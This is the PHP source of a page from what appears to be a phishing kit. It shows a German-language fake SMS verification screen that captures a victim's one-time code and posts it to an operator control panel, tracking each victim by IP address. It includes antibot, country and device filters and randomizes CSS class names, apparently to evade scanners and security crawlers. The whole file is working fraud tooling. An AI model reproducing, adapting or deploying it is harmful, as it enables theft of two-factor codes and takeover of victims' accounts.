<?php
    error_reporting(0);
    if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';

    $ip = get_client_ip();
    $get_name_file = $ip;
    $target_file = "../panel/storage/{$get_name_file}.json";
    $json_file = file_get_contents($target_file);
    $user_info = json_decode($json_file, true);
    $user_info['error_sms'];
    
    if($user_info['error_sms'] == 1) {
        $get_name_page = "Page SMS Code Error";
        $get_step = "sms-error";
    }else{
        $get_name_page = "Page SMS Code";
        $get_step = "sms";
    }
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> ">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>Webseite</title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> body">

    <!-- Start Main -->
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> main">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-main">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> bg-main">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> bg-element"></div>
                </div>
                <form action="../control-panel/check-action.php" method="post" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section" id="fSD">
                    <input type="hidden" name="step" value="<?php echo $get_step; ?>">
                    <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-menu-lang">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> menu-lang">
                            <img src="../img/icon-lang.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-lang">
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-lang">
                                Deutsch
                            </span>
                            <img src="../img/icon-arrow.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-arrow">
                        </div>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-all">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo">
                            <img src="../img/logo.png">
                        </div>
                        <h1>Bestätigungs Code-SMS</h1>
                        <p>
                            Bitte geben Sie einen per SMS gesendeten Code auf Ihrem Handy ein.
                        </p>
                        <?php
                            if ($user_info['error_sms'] == 1) {
                                echo
                                '<div class="message-error-pages">
                                    <img src="../img/icon-message-error.png" alt="">
                                    Ungültiger oder abgelaufener Code. Wir haben einen neuen Code gesendet.
                                </div>';
                            }
                        ?>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-i-a-l" id="div1">
                            <label for="mss">SMS-Code</label>
                            <input type="text" name="mss" id="mss" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element">
                            <small id="messageError1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i">Dieses Feld muss belegt sein!</small>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> parent-button">
                            <button type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> button-send-data" name="b_s_d_p" id="bSD">Nächste</button>
                        </div>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-all" style="margin-top: auto !important;">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-links">
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form">Kontaktieren Sie uns</span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form">Impressum</span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form">Cookie Einstellungen</span>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    <!-- End Main -->


    <!-- Script Js -->
    <script src="../js/script-step-three.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>